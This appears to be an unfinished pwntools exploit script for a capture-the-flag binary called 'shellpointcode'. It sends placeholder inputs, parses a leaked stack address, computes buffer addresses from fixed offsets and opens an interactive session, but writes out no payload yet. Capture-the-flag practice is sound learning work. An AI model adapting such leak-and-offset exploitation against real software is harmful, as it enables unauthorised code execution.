#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('shellpointcode')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
break *0x555555554954
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

buf1 = "test"
buf2 = "test"

buf1_off = -40
buf2_off = -8

io.sendlineafter(':', buf1)
io.sendlineafter(':', buf2)

io.recvuntil('next: ')
addr = int(io.recvline().strip(), 16)

buf1_addr = addr + buf1_off
buf2_addr = addr + buf2_off

log.info(hex(addr))

io.interactive()

